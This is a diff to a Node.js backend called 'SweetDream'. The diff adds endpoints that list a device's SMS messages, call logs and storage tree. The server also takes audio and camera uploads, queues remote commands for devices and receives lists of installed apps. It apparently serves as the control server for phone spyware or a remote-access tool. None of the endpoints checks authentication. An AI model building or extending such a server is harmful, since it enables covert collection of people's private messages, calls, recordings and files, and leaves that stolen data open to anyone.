@@ -1,4 +1,4 @@
-// server.js — SweetDream backend (updated)
+// server.js — SweetDream backend (final updated with SMS, Calls, Storage)
 const express = require("express");
 const bodyParser = require("body-parser");
 const Database = require("better-sqlite3");
@@ -14,7 +14,7 @@ const PORT = process.env.PORT || 3000;
 // ================== INIT ==================
 app.use(bodyParser.json());
 
-// SQLite DB file (can override via env)
+// SQLite DB file
 const DB_FILE = process.env.DB_FILE || "sweetdream.db";
 const db = new Database(DB_FILE);
 
@@ -42,9 +42,8 @@ db.prepare(`
 
 console.log("✅ SQLite (better-sqlite3) initialized");
 
-// ================== Firebase init (robust) ==================
+// ================== Firebase init ==================
 function loadFirebaseServiceAccount() {
-  // 1) Base64 JSON (safe for environment variables that strip newlines)
   if (process.env.FIREBASE_SA_BASE64) {
     try {
       const decoded = Buffer.from(process.env.FIREBASE_SA_BASE64, "base64").toString();
@@ -54,10 +53,8 @@ function loadFirebaseServiceAccount() {
     }
   }
 
-  // 2) Raw JSON in FIREBASE_SA
   if (process.env.FIREBASE_SA) {
     const val = process.env.FIREBASE_SA.trim();
-    // if it looks like JSON
     if (val.startsWith("{")) {
       try {
         return JSON.parse(val);
@@ -65,28 +62,21 @@ function loadFirebaseServiceAccount() {
         console.error("❌ Failed to parse FIREBASE_SA JSON:", err.message);
       }
     }
-    // if it's a path (not recommended on Render), try to read file
     try {
       if (fs.existsSync(val)) {
-        const txt = fs.readFileSync(val, "utf8");
-        return JSON.parse(txt);
+        return JSON.parse(fs.readFileSync(val, "utf8"));
       }
-    } catch (err) {
-      // ignore
-    }
+    } catch {}
   }
 
-  // 3) Local fallback for development (file at repo root)
   const localPath = path.join(__dirname, "firebase-service-account.json");
   if (fs.existsSync(localPath)) {
     try {
-      const txt = fs.readFileSync(localPath, "utf8");
-      return JSON.parse(txt);
+      return JSON.parse(fs.readFileSync(localPath, "utf8"));
     } catch (err) {
       console.error("❌ Failed to parse local firebase-service-account.json:", err.message);
     }
   }
-
   return null;
 }
 
@@ -98,12 +88,10 @@ try {
     });
     console.log("✅ Firebase Admin initialized");
   } else {
-    console.warn(
-      "⚠️ Firebase Admin NOT initialized — no service account found. Set FIREBASE_SA (JSON) or FIREBASE_SA_BASE64 (base64 JSON) in environment."
-    );
+    console.warn("⚠️ Firebase not initialized (no service account found).");
   }
 } catch (err) {
-  console.error("⚠️ Firebase init failed:", err && err.message ? err.message : err);
+  console.error("⚠️ Firebase init failed:", err.message);
 }
 
 // ================== HEALTH ==================
@@ -127,9 +115,7 @@ app.post("/events", (req, res) => {
 
 app.get("/events", (req, res) => {
   try {
-    const rows = db
-      .prepare("SELECT * FROM events ORDER BY id DESC LIMIT 200")
-      .all();
+    const rows = db.prepare("SELECT * FROM events ORDER BY id DESC LIMIT 200").all();
     res.json(rows);
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -152,9 +138,7 @@ app.post("/commands", (req, res) => {
 
 app.get("/commands/pending", (req, res) => {
   try {
-    const rows = db
-      .prepare("SELECT * FROM commands WHERE status = 'pending' ORDER BY id ASC")
-      .all();
+    const rows = db.prepare("SELECT * FROM commands WHERE status = 'pending' ORDER BY id ASC").all();
     res.json(rows);
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -175,17 +159,18 @@ app.post("/commands/:id/ack", (req, res) => {
 
 app.delete("/commands/cleanup", (req, res) => {
   try {
-    const stmt = db.prepare(
-      "DELETE FROM commands WHERE status = 'delivered' AND createdAt < datetime('now','-7 days')"
-    );
-    const result = stmt.run();
+    const result = db
+      .prepare(
+        "DELETE FROM commands WHERE status = 'delivered' AND createdAt < datetime('now','-7 days')"
+      )
+      .run();
     res.json({ success: true, deleted: result.changes });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
 });
 
-// ================== UPLOAD / LISTING ==================
+// ================== AUDIO UPLOAD/LIST ==================
 const audioStorage = multer.diskStorage({
   destination: (req, file, cb) => {
     const dir = path.join(__dirname, "uploads", "audio");
@@ -199,15 +184,13 @@ const audioStorage = multer.diskStorage({
 const uploadAudio = multer({ storage: audioStorage });
 
 app.post("/upload/audio", uploadAudio.single("file"), (req, res) => {
-  if (!req.file)
-    return res.status(400).json({ success: false, error: "No file uploaded" });
+  if (!req.file) return res.status(400).json({ success: false, error: "No file uploaded" });
   res.json({ success: true, path: req.file.path });
 });
 
 app.get("/download/audio/:filename", (req, res) => {
   const filePath = path.join(__dirname, "uploads", "audio", req.params.filename);
-  if (!fs.existsSync(filePath))
-    return res.status(404).json({ success: false, error: "File not found" });
+  if (!fs.existsSync(filePath)) return res.status(404).json({ success: false, error: "File not found" });
   res.download(filePath);
 });
 
@@ -219,11 +202,11 @@ app.get("/list/audio", (req, res) => {
       const stat = fs.statSync(path.join(dir, f));
       return { name: f, url: `/download/audio/${f}`, mtime: stat.mtimeMs };
     })
-    .sort((a,b) => b.mtime - a.mtime);
+    .sort((a, b) => b.mtime - a.mtime);
   res.json(files);
 });
 
-// Camera upload/list
+// ================== CAMERA UPLOAD/LIST ==================
 const cameraStorage = multer.diskStorage({
   destination: (req, file, cb) => {
     const dir = path.join(__dirname, "uploads", "camera");
@@ -237,8 +220,7 @@ const cameraStorage = multer.diskStorage({
 const uploadCamera = multer({ storage: cameraStorage });
 
 app.post("/upload/camera", uploadCamera.single("file"), (req, res) => {
-  if (!req.file)
-    return res.status(400).json({ success: false, error: "No file uploaded" });
+  if (!req.file) return res.status(400).json({ success: false, error: "No file uploaded" });
   res.json({ success: true, path: req.file.path });
 });
 
@@ -250,27 +232,88 @@ app.get("/list/camera", (req, res) => {
       const stat = fs.statSync(path.join(dir, f));
       return { name: f, url: `/download/camera/${f}`, mtime: stat.mtimeMs };
     })
-    .sort((a,b) => b.mtime - a.mtime);
+    .sort((a, b) => b.mtime - a.mtime);
   res.json(files);
 });
 
 app.get("/download/camera/:filename", (req, res) => {
   const filePath = path.join(__dirname, "uploads", "camera", req.params.filename);
-  if (!fs.existsSync(filePath))
-    return res.status(404).json({ success: false, error: "File not found" });
+  if (!fs.existsSync(filePath)) return res.status(404).json({ success: false, error: "File not found" });
   res.download(filePath);
 });
 
-// ================== APPS (device reports apps via events) ==================
+// ================== SMS (from events) ==================
+app.get("/list/sms", (req, res) => {
+  try {
+    const rows = db
+      .prepare("SELECT * FROM events WHERE type = 'sms:report' ORDER BY id DESC LIMIT 200")
+      .all();
+    const msgs = rows.map(r => {
+      try {
+        return JSON.parse(r.data);
+      } catch {
+        return null;
+      }
+    }).filter(Boolean);
+    res.json(msgs);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================== CALL LOGS (from events) ==================
+app.get("/list/calls", (req, res) => {
+  try {
+    const rows = db
+      .prepare("SELECT * FROM events WHERE type = 'calls:report' ORDER BY id DESC LIMIT 200")
+      .all();
+    const calls = rows.map(r => {
+      try {
+        return JSON.parse(r.data);
+      } catch {
+        return null;
+      }
+    }).filter(Boolean);
+    res.json(calls);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================== STORAGE (from events) ==================
+app.get("/list/storage", (req, res) => {
+  try {
+    const pathParam = req.query.path || "/";
+    const rows = db
+      .prepare("SELECT * FROM events WHERE type = 'storage:report' ORDER BY id DESC LIMIT 1")
+      .all();
+    if (rows.length === 0) return res.json([]);
+    const root = JSON.parse(rows[0].data || "{}");
+    // return full tree or specific path
+    if (pathParam === "/") {
+      res.json(root.children || []);
+    } else {
+      const parts = pathParam.split("/").filter(Boolean);
+      let current = root;
+      for (const part of parts) {
+        const found = (current.children || []).find(c => c.name === part && c.type === "folder");
+        if (!found) return res.json([]);
+        current = found;
+      }
+      res.json(current.children || []);
+    }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================== APPS ==================
 app.get("/apps", (req, res) => {
   try {
     const rows = db
       .prepare("SELECT * FROM events WHERE type = 'apps:report' ORDER BY id DESC LIMIT 1")
       .all();
-
     if (rows.length === 0) return res.json([]);
-
-    // rows[0].data may be a JSON string of an object { apps: [...] } or an array
     let latest = [];
     try {
       const parsed = JSON.parse(rows[0].data || "[]");
